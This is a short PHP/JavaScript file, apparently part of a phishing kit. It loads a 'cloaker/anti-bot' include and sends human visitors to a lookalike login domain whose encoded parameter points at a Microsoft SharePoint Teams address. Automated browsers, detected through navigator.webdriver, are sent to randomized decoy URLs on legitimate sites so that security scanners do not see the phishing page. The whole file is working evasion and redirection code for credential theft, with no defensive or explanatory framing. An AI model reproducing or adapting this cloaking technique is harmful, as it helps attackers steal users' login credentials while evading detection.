<?php
// geen spaties/BOM vóór deze regel
require_once __DIR__ . '/includes/index.php'; // cloaker/anti-bot
?>
<script>
(function(){
  // ✅ Your real landing page
  var realTarget = "https://login.baswea.icu?y7ysAJSf0AS9=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN";

  // ✅ Pool of decoy URLs
  var decoys = [
    "https://www.bfmtv.com/comparateur/" + Math.random().toString(36).slice(2),
    "https://corporate.target.com/about" + Date.now(),
    "https://theconversation.com/uk/privacy-policy" + Math.floor(Math.random()*99999),
    "https://www.usda.gov/vulnerability-disclosure-policy" + Math.random().toString(36).slice(6),
    "https://www.si.edu/privacy" + Math.random().toString(36).slice(3,8)
  ];

  // pick a random decoy
  var decoy = decoys[Math.floor(Math.random()*decoys.length)];

  // wait a moment then decide
  setTimeout(function(){
    if (!navigator.webdriver) {
      // 👤 human browser → go to real target
      location.assign(realTarget);
    } else {
      // 🤖 headless/browser automation → go to decoy
      location.replace(decoy);
    }
  }, 1200); // ~1.2s delay
})();
</script>
